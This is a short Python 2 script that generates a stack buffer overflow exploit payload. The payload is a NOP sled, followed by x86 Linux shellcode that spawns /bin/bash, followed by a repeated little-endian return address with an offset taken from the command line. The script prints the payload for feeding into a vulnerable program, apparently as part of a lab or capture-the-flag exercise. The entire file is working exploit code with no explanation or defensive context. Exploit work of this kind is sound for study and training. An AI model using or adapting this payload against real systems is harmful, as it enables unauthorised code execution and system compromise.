#!/usr/bin/python
import struct
import sys

if len(sys.argv) == 1:
    offset = 0
else:
    offset = int(sys.argv[1])

nop = '\x90'
brk = '\xcc'
shellcode = "\x31\xc0\x6a\x68" + \
            "\x68\x2f\x62\x61" + \
            "\x73\x68\x2f\x62" + \
            "\x69\x6e\x89\xe3" + \
            "\x50\x53\x89\xe1" + \
            "\x8d\x51\x04\x04" + \
            "\x05\x04\x06\xcd" + \
            "\x80"
shellcode = nop * 3 + shellcode
sled = nop * 80

addr = struct.pack("<I", 0xffffcf08 + 40 + offset)

s = sled + shellcode + addr * 20
print s
